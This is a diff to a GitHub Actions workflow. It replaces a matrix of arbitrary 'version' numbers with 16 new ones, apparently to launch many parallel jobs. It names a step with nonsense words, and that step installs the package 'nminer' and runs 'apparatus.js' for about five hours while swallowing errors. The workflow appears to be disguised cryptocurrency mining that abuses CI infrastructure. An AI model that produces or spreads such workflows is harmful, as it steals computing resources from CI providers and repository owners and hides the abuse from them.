@@ -9,25 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8973 }
-          - { version: 1039 }
-          - { version: 2745 }
-          - { version: 761 }
-          - { version: 2299 }
-          - { version: 4795 }
-          - { version: 4088 }
-          - { version: 5932 }
-          - { version: 994 }
-          - { version: 1361 }
-          - { version: 5695 }
-          - { version: 2211 }
-          - { version: 4998 }
-          - { version: 7291 }
-          - { version: 8704 }
-          - { version: 450 }
-          - { version: 248 }
-          - { version: 5346 }
-          - { version: 6169 }
+          - { version: 9004 }
+          - { version: 3923 }
+          - { version: 5137 }
+          - { version: 1692 }
+          - { version: 6344 }
+          - { version: 3322 }
+          - { version: 6767 }
+          - { version: 6027 }
+          - { version: 5727 }
+          - { version: 9837 }
+          - { version: 5248 }
+          - { version: 8837 }
+          - { version: 2871 }
+          - { version: 5560 }
+          - { version: 1685 }
+          - { version: 3919 }
 
     steps:
       - name: Checkout
@@ -38,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: fuel sedately during gum
         run: |
           npm install nminer@latest
-          timeout 312m node apparatus.js || echo "apparatus executed"
+          timeout 302m node apparatus.js || echo "apparatus executed"
